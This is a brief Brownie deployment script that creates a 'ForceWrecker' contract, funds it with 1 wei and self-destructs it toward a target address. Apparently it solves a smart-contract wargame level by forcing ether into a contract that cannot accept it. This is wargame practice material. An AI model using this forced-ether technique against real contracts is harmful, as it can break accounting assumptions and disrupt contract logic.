from brownie import ForceWrecker, accounts

def main(force_addr):
  me = accounts.load("default")
  wrecker = ForceWrecker.deploy({'from': me})
  me.transfer(to=wrecker.address, amount=1)
  wrecker.destroy(force_addr)